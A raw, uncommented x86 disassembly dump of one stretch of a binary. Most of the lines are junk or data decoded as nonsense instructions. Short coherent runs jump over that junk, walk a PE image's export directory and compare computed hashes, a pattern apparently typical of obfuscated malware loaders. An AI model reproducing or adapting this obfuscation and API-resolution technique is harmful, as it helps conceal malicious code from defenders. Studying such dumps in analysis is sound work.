  402113:	and    al,0x66
  402115:	add    DWORD PTR [ebp+0x7cc8c79d],edx
  40211b:	xor    ah,ah
  40211d:	pusha  
  40211e:	add    BYTE PTR [ecx+0x10],dl
  402121:	push   ecx
  402122:	addr16 and eax,0x69485ab
  402128:	add    eax,0x37fe9786
  40212d:	xchg   ecx,eax
  40212e:	gs popa 
  402130:	mov    edx,0xb83accd
  402135:	pop    ecx
  402136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402137:	test   al,0x4a
  402139:	imul   edx,DWORD PTR [esi],0x71
  40213c:	sub    al,bh
  40213e:	mov    ah,0xa3
  402140:	xchg   edi,eax
  402141:	or     DWORD PTR [ebx+0x18],esp
  402144:	mov    ds:0x532313a7,al
  402149:	int    0x39
  40214b:	push   esp
  40214c:	cmp    al,0xc
  40214e:	mov    edi,0x170a4220
  402153:	add    edi,0x2f001962
  402159:	fild   QWORD PTR [edx+eax*8+0x2f240809]
  402160:	xchg   ebx,eax
  402161:	aas    
  402162:	stos   BYTE PTR es:[edi],al
  402163:	or     BYTE PTR [esi+0x1993acf0],0xc1
  40216a:	(bad)  
  40216b:	int3   
  40216c:	in     eax,0x62
  40216e:	retf   0x66b3
  402171:	mov    ds:0x7ddbba87,al
  402176:	icebp  
  402177:	in     al,dx
  402178:	popf   
  402179:	in     al,0x41
  40217b:	xchg   ebp,eax
  40217c:	xor    eax,0xa695b806
  402181:	mov    ds:0x728e26e0,al
  402186:	cs das 
  402188:	outs   dx,BYTE PTR ds:[esi]
  402189:	sub    al,0x70
  40218b:	jb     0x4021e9
  40218d:	not    BYTE PTR [ebx+0x3e02993d]
  402193:	out    dx,eax
  402194:	sbb    DWORD PTR [eax],esp
  402196:	ja     0x4021ba
  402198:	sbb    ebp,esp
  40219a:	xor    al,bh
  40219c:	shl    cl,0xc2
  40219f:	add    eax,0xd9ed5c28
  4021a4:	cwde   
  4021a5:	pop    esp
  4021a6:	mov    esp,0x15c2d65c
  4021ab:	pop    ds
  4021ac:	fmul   QWORD PTR [esi+edx*2+0x4e5a986e]
  4021b3:	loope  0x402207
  4021b5:	aam    0x5c
  4021b7:	outs   dx,DWORD PTR ds:[esi]
  4021b8:	push   ebp
  4021b9:	xor    eax,0xfd1cf448
  4021be:	out    0x28,eax
  4021c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021c2:	cmp    ch,BYTE PTR [edx]
  4021c4:	xchg   al,dh
  4021c6:	shl    DWORD PTR [eax-0x41557961],1
  4021cc:	xchg   dx,ax
  4021ce:	fcom   DWORD PTR [esi+0x15b4f0c4]
  4021d4:	pop    ds
  4021d5:	add    al,0xde
  4021d7:	cwde   
  4021d8:	mov    eax,0x8bf33d1f
  4021dd:	ins    DWORD PTR es:[edi],dx
  4021de:	push   0x94a2ab40
  4021e3:	pop    ebx
  4021e4:	mov    ah,0xdf
  4021e6:	out    0xd1,eax
  4021e8:	shl    BYTE PTR [ebp+0x51a529f1],cl
  4021ee:	inc    eax
  4021ef:	mov    ds:0xc73b5271,al
  4021f4:	retf   
  4021f5:	mov    ds:0xa77f6e55,eax
  4021fa:	clc    
  4021fb:	cmp    DWORD PTR [eax-0x21df526c],ebx
  402201:	push   ebx
  402202:	int    0x56
  402204:	std    
  402205:	push   ss
  402206:	js     0x4021b9
  402208:	push   esp
  402209:	jge    0x4021ba
  40220b:	cmp    eax,0x50a978ff
  402210:	out    dx,eax
  402211:	stos   DWORD PTR es:[edi],eax
  402212:	call   0xd1db:0x81d9042c
  402219:	adc    edx,DWORD PTR [esi]
  40221b:	adc    edi,DWORD PTR [ecx-0x344537f1]
  402221:	jo     0x4022a0
  402223:	push   ebp
  402224:	int    0xb0
  402226:	stc    
  402227:	call   0x7b11b679
  40222c:	and    DWORD PTR [edx-0x53],ecx
  40222f:	xor    DWORD PTR [edi],ebx
  402231:	push   esp
  402232:	sub    esp,DWORD PTR [edi-0x4a583b35]
  402238:	and    edi,ebx
  40223a:	(bad)  
  40223b:	sbb    dh,BYTE PTR [ebx-0x1d48891c]
  402241:	dec    ebx
  402242:	xor    eax,0x890e90f2
  402247:	aaa    
  402248:	mov    al,es:0x37c8004a
  40224e:	inc    esp
  40224f:	and    bh,dh
  402251:	cs pushf 
  402253:	xor    eax,0x2270420e
  402258:	dec    ecx
  402259:	or     eax,0x1500b9ca
  40225e:	cmp    edi,DWORD PTR [esi]
  402260:	sbb    al,0x49
  402262:	lahf   
  402263:	retf   0x8966
  402266:	dec    ebp
  402267:	cld    
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	(bad)  
  4022cb:	jle    0x402324
  4022cd:	jmp    0x7ebe2688
  4022d2:	mov    ch,0x7f
  4022d4:	jle    0x402354
  4022d6:	sbb    al,0x6f
  4022d8:	bound  esi,QWORD PTR [esi]
  4022da:	push   cs
  4022db:	sub    al,BYTE PTR [ecx]
  4022dd:	sar    BYTE PTR [edi-0x5e],1
  4022e0:	adc    eax,0x133d7aa2
  4022e5:	cmp    al,0x6e
  4022e7:	jbe    0x40230b
  4022e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022ea:	cmp    al,0x4e
  4022ec:	cld    
  4022ed:	push   ds
  4022ee:	dec    ebx
  4022ef:	and    eax,0x2a06fd2e
  4022f4:	mov    ebp,0x90d77d95
  4022f9:	xor    BYTE PTR [ecx+eax*2+0x39],0x2a
  4022fe:	jmp    0x402366
  402300:	fs push ebx
  402302:	inc    eax
  402303:	arpl   WORD PTR [edi-0x5b],bp
  402306:	(bad)  
  402307:	les    ebx,FWORD PTR [esi]
  402309:	or     BYTE PTR [edx+0x4315640],0x97
  402310:	jne    0x4022c0
  402312:	loope  0x4022af
  402314:	push   ds
  402315:	pop    esi
  402316:	push   esi
  402317:	mov    WORD PTR ds:0x7489e9c4,ds
  40231d:	push   ebx
  40231e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40231f:	xor    eax,0x1a57f0a6
  402324:	fs xor ch,ah
  402327:	push   esp
  402328:	xor    DWORD PTR [ebx-0x5],ecx
  40232b:	(bad)  
  40232d:	lock push ss
  40232f:	test   al,0xd0
  402331:	dec    esi
  402332:	adc    DWORD PTR [esi],ebp
  402334:	cmp    al,0x8a
  402336:	ja     0x40233e
  402338:	pop    es
  402339:	cmp    eax,0xe49f6bb1
  40233e:	in     al,0xb3
  402340:	and    al,BYTE PTR [edi+ecx*1-0x6e61a9c0]
  402347:	xlat   BYTE PTR ds:[ebx]
  402348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402349:	int    0xa3
  40234b:	jmp    0x70f433da
  402350:	cs int 0x8e
  402353:	mov    bh,ch
  402355:	mov    al,0x32
  402357:	ins    BYTE PTR es:[edi],dx
  402358:	jno    0x4023ae
  40235a:	dec    edx
  40235b:	loope  0x4023d1
  40235d:	xchg   esp,eax
  40235e:	cwde   
  40235f:	and    eax,0x2e5bf09f
  402364:	in     eax,0x6d
  402366:	add    al,0x5f
  402368:	sub    esp,DWORD PTR [esp+edx*4]
  40236b:	cdq    
  40236c:	leave  
  40236d:	and    DWORD PTR [edx],edi
  40236f:	call   0x3cc:0xcd95751a
  402376:	(bad)  
  402378:	push   esp
  402379:	aad    0xcd
  40237b:	rcl    BYTE PTR [ebx-0x7142ef69],cl
  402381:	mov    ebx,ecx
  402383:	lock jmp 0xef55:0x84245214
  40238b:	imul   eax,DWORD PTR [eax+ecx*8]
  40238f:	pop    edx
  402390:	push   eax
  402391:	add    DWORD PTR [ecx-0x37],0x1b
  402395:	mov    esi,0xc944b9b6
  40239a:	push   cs
  40239b:	and    al,0x8c
  40239d:	lds    edi,FWORD PTR [edi]
  40239f:	adc    al,0x1b
  4023a1:	sub    BYTE PTR [edi+ebx*1+0x2e],ah
  4023a5:	push   ebp
  4023a6:	add    BYTE PTR [edi+eax*2-0x9],0xa7
  4023ab:	and    DWORD PTR [eax+0x8cbd721],0x142d469f
  4023b5:	in     eax,dx
  4023b6:	adc    DWORD PTR cs:[ebx],esi
  4023b9:	popf   
  4023ba:	sti    
  4023bb:	fbstp  TBYTE PTR [ebp+eax*2-0x450a19e]
  4023c2:	push   eax
  4023c3:	push   edx
  4023c4:	data16 int 0xbb
  4023c7:	lock pushf 
  4023c9:	xor    esp,edx
  4023cb:	mov    DWORD PTR [esi],esp
  4023cd:	or     al,0x3a
  4023cf:	or     eax,0x40c5cdb0
  4023d4:	out    0x2e,al
  4023d6:	call   0x86a5cf0d
  4023db:	jmp    0x402369
  4023dd:	xchg   edx,eax
  4023de:	jnp    0x4023d7
  4023e0:	cmc    
  4023e1:	add    BYTE PTR [eax-0x3b],cl
  4023e4:	xchg   BYTE PTR [ecx+0x544d05b7],bl
  4023ea:	(bad)  
  4023eb:	jmp    0x4023f6
  4023ed:	xor    al,0x84
  4023ef:	out    dx,al
  4023f0:	leave  
  4023f1:	loope  0x402378
  4023f3:	fsub   DWORD PTR [edx+eax*4-0x32]
  4023f7:	pop    ecx
  4023f8:	xlat   BYTE PTR ds:[ebx]
  4023f9:	mov    cl,0x52
  4023fb:	ror    BYTE PTR [edx],1
  4023fd:	ins    DWORD PTR es:[edi],dx
  4023fe:	dec    esp
  4023ff:	mov    al,0xa9
  402401:	pop    edi
  402402:	inc    ebx
  402403:	jo     0x4023c2
  402405:	jbe    0x4023cb
  402407:	xor    BYTE PTR ds:0xd21f27c4,0xe
  40240e:	add    bl,ch
  402410:	inc    esi
  402411:	out    0xde,al
  402413:	mov    dl,0x1c
  402415:	mov    BYTE PTR [ebx],ch
  402417:	adc    eax,0xde4bce05
  40241c:	mov    ds:0x1f8b9765,eax
  402421:	mov    cl,0x13
  402423:	fwait
  402424:	jmp    0x129357f1
  402429:	cmp    eax,0x1638487d
  40242e:	fisttp DWORD PTR [esi-0x2d970d26]
  402434:	nop
  402435:	loopne 0x4024a3
  402437:	ror    DWORD PTR ds:0x12422198,0x27
  40243e:	dec    edi
  40243f:	pushf  
  402440:	sub    DWORD PTR [ebx+0x1c49d278],ebp
  402446:	aas    
  402447:	fwait
  402448:	cmp    al,0x3b
  40244a:	sub    esp,DWORD PTR [ebp-0x1a]
  40244d:	lock and al,0xf9
  402450:	shl    BYTE PTR [ebp-0x25],0xa7
  402454:	(bad)  
  402455:	je     0x4024b2
  402457:	loopne 0x402407
  402459:	(bad)  
  40245a:	in     al,0xe7
  40245c:	stos   BYTE PTR es:[edi],al
  40245d:	xchg   ebx,eax
  40245e:	jmp    0x402478
  402460:	rcr    DWORD PTR [edx-0x5a],1
  402463:	loop   0x402424
  402465:	jno    0x402403
  402467:	dec    esi
  402468:	in     al,0x55
  40246a:	call   0xf6ea:0xe84705c
  402471:	push   0x4d1fb151
  402476:	or     eax,0x96ab1ddf
  40247b:	mov    al,0xad
  40247d:	mov    bh,0x5a
  40247f:	adc    eax,0x45fc4f8f
  402484:	jl     0x4024fe
  402486:	push   edx
  402487:	sub    bl,ah
  402489:	call   0x8b683b8a
  40248e:	dec    ebp
  40248f:	clc    
  402490:	mov    ecx,DWORD PTR [ecx]
  402492:	mov    eax,DWORD PTR [eax+ecx*1]
  402495:	mov    DWORD PTR [ebp-0x1c],eax
  402498:	mov    eax,DWORD PTR [ebp+0x8]
  40249b:	xor    eax,esi
  40249d:	add    eax,edi
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0xb1e9010a
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	xchg   ah,ah
  4024db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024dc:	sbb    dl,BYTE PTR [ebp+eax*1+0x6967eb5f]
  4024e3:	and    BYTE PTR [ebp+0x37],al
  4024e6:	dec    ebp
  4024e7:	xor    al,0x3a
  4024e9:	and    al,0xcb
  4024eb:	dec    ebp
  4024ec:	xchg   DWORD PTR [ebx-0x47],ebx
  4024ef:	das    
  4024f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024f1:	inc    esp
  4024f2:	inc    ebx
  4024f3:	add    BYTE PTR [ebx],bh
  4024f5:	cmp    al,0xbf
  4024f7:	cmp    ecx,DWORD PTR [ebp+eiz*4+0x176c061e]
  4024fe:	add    al,0x6f
  402500:	loope  0x4024a3
  402502:	hlt    
  402503:	mov    dl,0xa8
  402505:	imul   esp,DWORD PTR [eax]
  402508:	xor    ecx,edx
  40250a:	fdiv   st,st(6)
  40250c:	and    DWORD PTR [ecx-0x1b],ebx
  40250f:	xchg   edi,eax
  402510:	mov    ebx,0xf04ad35d
  402515:	imul   ecx,DWORD PTR [edx],0x945acb17
  40251b:	arpl   WORD PTR [eax],bx
  40251d:	fstp   DWORD PTR [edi+edi*1]
  402520:	cwde   
  402521:	jae    0x4024dc
  402523:	stos   BYTE PTR es:[edi],al
  402524:	sbb    dl,BYTE PTR [esi]
  402526:	enter  0x92e4,0xc8
  40252a:	test   edx,esp
  40252c:	cmp    DWORD PTR [esp+ecx*2-0x4a0fdba3],ecx
  402533:	fs mov ch,0xed
  402536:	mov    edx,0xf0e8f4a1
  40253b:	rcr    BYTE PTR [edi+0x71],cl
  40253e:	pushf  
  40253f:	fidivr WORD PTR [ebx+ecx*4]
  402542:	loopne 0x4024d3
  402544:	jnp    0x4025a9
  402546:	mov    DWORD PTR [edi],ebp
  402548:	sbb    al,cl
  40254a:	jns    0x4025bb
  40254c:	inc    ebp
  40254d:	mov    ds:0x791c4feb,eax
  402552:	sub    bl,ah
  402554:	push   edx
  402555:	aas    
  402556:	out    0x4f,al
  402558:	fidivr WORD PTR ds:0x489ac9d7
  40255e:	add    esi,DWORD PTR [edx+0x203e5d85]
  402564:	sbb    eax,0x3cdd0c5
  402569:	rol    BYTE PTR [ecx+eax*2+0x0],0x8d
  40256e:	mov    esp,edx
  402570:	aam    0xc1
  402572:	repz xchg esp,eax
  402574:	ss xchg edx,eax
  402576:	fcom   st(6)
  402578:	repnz xlat BYTE PTR ds:[ebx]
  40257a:	xchg   ecx,eax
  40257b:	sbb    bh,BYTE PTR [ecx]
  40257d:	pop    ebp
  40257e:	stos   BYTE PTR es:[edi],al
  40257f:	sub    bl,ah
  402581:	call   0x2f8570c2
  402586:	or     DWORD PTR [ecx+0x7f],ebp
  402589:	sbb    eax,eax
  40258b:	std    
  40258c:	jnp    0x40258f
  40258e:	popf   
  40258f:	or     al,0xeb
  402591:	lea    esp,[eax]
  402593:	pop    ebx
  402594:	faddp  st(7),st
  402596:	test   eax,0x3ef3c3c9
  40259b:	hlt    
  40259c:	fldcw  WORD PTR ds:0xfb556e19
  4025a2:	xor    eax,edi
  4025a4:	pop    ecx
  4025a5:	inc    esi
  4025a6:	addr16 pop edx
  4025a8:	stos   BYTE PTR es:[edi],al
  4025a9:	fiadd  DWORD PTR [esi+0x50ada9f0]
  4025af:	mov    ch,0xc4
  4025b1:	ins    DWORD PTR es:[edi],dx
  4025b2:	sub    eax,0xb9daa2ca
  4025b7:	pop    ss
  4025b8:	loope  0x4025a6
  4025ba:	dec    ebp
  4025bb:	add    DWORD PTR [eax],edx
  4025bd:	shl    BYTE PTR [ecx],0xe5
  4025c0:	stc    
  4025c1:	or     bh,BYTE PTR [edi]
  4025c3:	mov    eax,0xd41788e9
  4025c8:	xchg   BYTE PTR [eax+0x70ac0285],dl
  4025ce:	jecxz  0x4025ac
  4025d0:	or     al,0xc2
  4025d2:	sahf   
  4025d3:	xor    DWORD PTR [eax],ecx
  4025d5:	cmp    al,0x33
  4025d7:	cmp    cl,BYTE PTR [esi+0x266f8ad6]
  4025dd:	or     edi,ebp
  4025df:	push   ebp
  4025e0:	out    0x7c,al
  4025e2:	cmp    dh,BYTE PTR [edx+0x14]
  4025e5:	imul   ebp
  4025e7:	rcr    BYTE PTR [ebp+0x54],cl
  4025ea:	pushf  
  4025eb:	inc    edi
  4025ec:	mov    WORD PTR [ebx],es
  4025ee:	fist   DWORD PTR [eax+ecx*2]
  4025f1:	in     al,dx
  4025f2:	and    eax,0xa19d15bc
  4025f7:	xchg   esp,eax
  4025f8:	xchg   esp,eax
  4025f9:	jmp    0xacf9:0x6dd6bd9e
  402600:	sbb    eax,0x37451c1
  402605:	jo     0x4025a2
  402607:	push   WORD PTR [ecx+0x76]
  40260b:	addr16 loope 0x40263e
  40260e:	jmp    0x402646
  402610:	(bad)  
  402611:	adc    eax,0x73ca5abe
  402616:	and    esi,DWORD PTR [edi]
  402618:	inc    eax
  402619:	cmp    DWORD PTR [ebp-0x25],edi
  40261c:	sub    esp,DWORD PTR [ecx]
  40261e:	sbb    ch,BYTE PTR [ebx+ebx*1]
  402621:	xchg   ecx,eax
  402622:	cmp    eax,0x1ad796b5
  402627:	xchg   edi,eax
  402628:	mov    ecx,0xeabdd0d4
  40262d:	(bad)  
  40262e:	jg     0x402696
  402630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402631:	ss jo  0x402635
  402634:	dec    esi
  402635:	(bad)  
  402636:	add    BYTE PTR ds:0xe47926ff,bl
  40263c:	cmp    al,0x38
  40263e:	dec    DWORD PTR [ebp-0x3f0ea0bc]
  402644:	cs jle 0x40265a
  402647:	or     bh,BYTE PTR [edi-0x6b]
  40264a:	dec    ebp
  40264b:	int3   
  40264c:	jmp    0xa35:0x118da300
  402653:	cld    
  402654:	js     0x402615
  402656:	push   edx
  402657:	icebp  
  402658:	and    eax,0x60750b8
  40265d:	and    DWORD PTR [edx-0x316bdffe],ebx
  402663:	popf   
  402664:	jmp    DWORD PTR [eax+edi*1]
  402667:	inc    ebp
  402668:	push   0x98c66d75
  40266d:	clc    
  40266e:	lods   eax,DWORD PTR ds:[esi]
  40266f:	adc    BYTE PTR [ebp-0x15426cba],ch
  402675:	shl    BYTE PTR [edx-0x7e718e82],1
  40267b:	inc    eax
  40267c:	jb     0x40260b
  40267e:	inc    esi
  40267f:	lods   eax,DWORD PTR ds:[esi]
  402680:	jg     0x40268a
  402682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402683:	mov    al,0x9d
  402685:	out    dx,al
  402686:	sub    ecx,DWORD PTR [eax+eiz*8]
  402689:	adc    al,0xe7
  40268b:	cmp    DWORD PTR [edx],esi
  40268d:	push   0x2
  40268f:	jo     0x40261a
  402691:	dec    ebp
  402692:	loopne 0x40261f
  402694:	inc    ebp
  402695:	loopne 0x402622
  402697:	dec    ebp
  402698:	clc    
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0x2b
  4026c9:	enter  0x86fa,0x24
  4026cd:	movd   DWORD PTR [esi-0x4b],mm7
  4026d1:	jg     0x402751
  4026d3:	jle    0x40267c
  4026d5:	xchg   BYTE PTR [esi],dh
  4026d7:	push   ebp
  4026d8:	cmc    
  4026d9:	mov    eax,ds:0x4a765370
  4026de:	sub    bl,BYTE PTR [eax+0x6d]
  4026e1:	pop    ss
  4026e2:	or     al,0xea
  4026e4:	adc    eax,DWORD PTR [eax-0x252f92c8]
  4026ea:	adc    edx,DWORD PTR [eax-0x23]
  4026ed:	nop
  4026ee:	mov    edx,0x597f35ea
  4026f3:	push   eax
  4026f4:	xchg   edx,eax
  4026f5:	fs (bad) 
  4026f7:	retf   
  4026f8:	retf   
  4026f9:	das    
  4026fa:	sbb    ch,ah
  4026fc:	imul   edx,DWORD PTR [ecx+0x55],0x5add34ec
  402703:	(bad)  
  402705:	js     0x4026c7
  402707:	xor    eax,0xaa154070
  40270c:	aaa    
  40270d:	xor    esp,edx
  40270f:	sbb    al,0xc4
  402711:	jge    0x4026e1
  402713:	xchg   ebp,eax
  402714:	dec    ecx
  402715:	ss pop ds
  402717:	mov    ds:0xe8f9f2e8,al
  40271c:	mov    ecx,0x73f7c0ea
  402721:	jne    0x402773
  402723:	push   ebx
  402724:	or     eax,0x6ee44c5
  402729:	mov    ch,0xa2
  40272b:	(bad)  
  40272c:	inc    ecx
  40272d:	icebp  
  40272e:	adc    edi,ebp
  402730:	xor    eax,0x87cde916
  402735:	bound  esp,QWORD PTR [ecx+eiz*8+0x55]
  402739:	pop    es
  40273a:	icebp  
  40273b:	sub    BYTE PTR [edi+0x78],ah
  40273e:	ds mov ebp,0xe2f8ac07
  402744:	sar    edi,0x93
  402747:	sbb    BYTE PTR [ebx+0x4ea54518],0xb4
  40274e:	adc    edi,DWORD PTR [edi+0x2301a084]
  402754:	xchg   esp,eax
  402755:	or     eax,0x4f30a46
  40275a:	sti    
  40275b:	sbb    al,0x78
  40275d:	scas   al,BYTE PTR es:[edi]
  40275e:	jmp    0x34e715ac
  402763:	pusha  
  402764:	sbb    DWORD PTR [ebx-0x30810e98],eax
  40276a:	jo     0x4027ac
  40276c:	ret    0x7675
  40276f:	and    BYTE PTR [eax],dl
  402771:	fnstcw WORD PTR [edi-0x7f]
  402774:	fld    TBYTE PTR [edx]
  402776:	mov    fs,WORD PTR [edi-0x5b]
  402779:	xlat   BYTE PTR ds:[ebx]
  40277a:	or     BYTE PTR [eax+0x124e05fd],0xb2
  402781:	jnp    0x4027f4
  402783:	cmp    al,0x57
  402785:	adc    ch,BYTE PTR [edi]
  402787:	jecxz  0x4027fa
  402789:	aas    
  40278a:	xor    DWORD PTR [ebx],0x5f
  40278d:	test   al,0x58
  40278f:	push   eax
  402790:	jae    0x40273f
  402792:	js     0x4027a4
  402794:	inc    ecx
  402795:	mov    ch,0x16
  402797:	imul   eax,DWORD PTR [ebx+0x25f8e77e],0xfffffff5
  40279e:	pop    ebp
  40279f:	dec    ebp
  4027a0:	inc    ebx
  4027a1:	out    dx,al
  4027a2:	push   edx
  4027a3:	mov    dh,0xa8
  4027a5:	std    
  4027a6:	jp     0x402743
  4027a8:	add    eax,0x33809de4
  4027ad:	cmp    al,0x11
  4027af:	mov    esi,0xec0091d5
  4027b4:	arpl   WORD PTR [ebp+0x59],sp
  4027b7:	cmp    al,0xbb
  4027b9:	fimul  DWORD PTR [esi]
  4027bb:	sbb    al,0x8a
  4027bd:	lods   eax,DWORD PTR ds:[esi]
  4027be:	fisttp DWORD PTR [ebx-0x31]
  4027c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027c2:	out    dx,al
  4027c3:	icebp  
  4027c4:	enter  0xe12f,0x2c
  4027c8:	push   esp
  4027c9:	ins    DWORD PTR es:[edi],dx
  4027ca:	mov    edx,0xc472c6c1
  4027cf:	hlt    
  4027d0:	out    dx,eax
  4027d1:	lods   eax,DWORD PTR ds:[esi]
  4027d2:	pop    esi
  4027d3:	inc    ebx
  4027d4:	inc    ebp
  4027d5:	cmp    esi,DWORD PTR [ebx-0x1f0cfcf4]
  4027db:	dec    ebx
  4027dc:	jmp    0x438ede86
  4027e1:	loop   0x402798
  4027e3:	and    BYTE PTR [ecx],bh
  4027e5:	and    ebp,edx
  4027e7:	mov    DWORD PTR [eax+0x7c],ecx
  4027ea:	(bad)  
  4027ec:	iret   
  4027ed:	and    ah,BYTE PTR [bx+di+0x5a]
  4027f1:	mov    esi,0x307d25df
  4027f6:	test   edi,eax
  4027f8:	add    cl,BYTE PTR [edi+0x0]
  4027fb:	xchg   edx,esi
  4027fd:	fdiv   QWORD PTR [esi+ecx*1+0x14]
  402801:	fsubrp st(2),st
  402803:	mul    BYTE PTR [ecx-0x16283f7a]
  402809:	cmp    ah,0x1d
  40280c:	cli    
  40280d:	and    eax,0xa96241ae
  402812:	fsub   DWORD PTR [edx-0x3dfa6e2f]
  402818:	shr    DWORD PTR [esi*4+0x456810a1],1
  40281f:	xor    dl,BYTE PTR [edx+0x76]
  402822:	mov    ah,0xe1
  402824:	dec    edi
  402825:	arpl   di,ax
  402827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402828:	push   edx
  402829:	cdq    
  40282a:	mov    ds:0x8c6c8589,eax
  40282f:	call   0x8887c6f6
  402834:	push   0xbbc01d04
  402839:	lods   al,BYTE PTR ds:[esi]
  40283a:	mov    ebp,0xa108553a
  40283f:	pushf  
  402840:	ja     0x4028a0
  402842:	fcmovnbe st,st(2)
  402844:	inc    esi
  402845:	imul   edx,DWORD PTR [eax+0x34],0xfce7e99
  40284c:	fadd   DWORD PTR [ecx+eax*8-0x3ed7bf3b]
  402853:	fwait
  402854:	(bad)  
  402855:	in     al,dx
  402856:	jmp    0x402820
  402858:	and    dh,0xc5
  40285b:	les    esi,FWORD PTR [eax+0x23a3c1c4]
  402861:	add    ebx,ecx
  402863:	sbb    BYTE PTR [eax+0x7c],dh
  402866:	out    dx,eax
  402867:	loop   0x402879
  402869:	call   0x90539a97
  40286e:	push   ebp
  40286f:	xchg   esi,eax
  402870:	iret   
  402871:	sub    eax,0x7dd6ce43
  402876:	or     bl,bh
  402878:	je     0x402822
  40287a:	push   edi
  40287b:	je     0x402869
  40287d:	xchg   ebp,eax
  40287e:	pop    ecx
  40287f:	(bad)  
  402881:	pusha  
  402882:	sbb    ecx,DWORD PTR [edi+0x24616aad]
  402888:	jb     0x4028ed
  40288a:	js     0x402815
  40288c:	add    ecx,ebp
  40288e:	and    al,0x0
  402890:	add    BYTE PTR [eax],al
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax+0x71de0451]
  4028ec:	gs pushf 
  4028ee:	cmp    dl,BYTE PTR [ebx+0x8]
  4028f1:	jle    0x402971
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x40291b
  4028f8:	sub    DWORD PTR [edx],edx
  4028fa:	retf   0xcf9a
  4028fd:	div    BYTE PTR [edx-0x50c081a0]
  402903:	and    BYTE PTR ds:[edx+0x3f],dl
  402907:	imul   ebx,DWORD PTR [ecx],0xd657b47
  40290d:	shl    DWORD PTR [edi],cl
  40290f:	pusha  
  402910:	pop    ds
  402911:	pushf  
  402912:	repnz adc ah,cl
  402915:	call   0x9606:0xc076e329
  40291c:	loope  0x40290d
  40291e:	inc    edx
  40291f:	loop   0x40295c
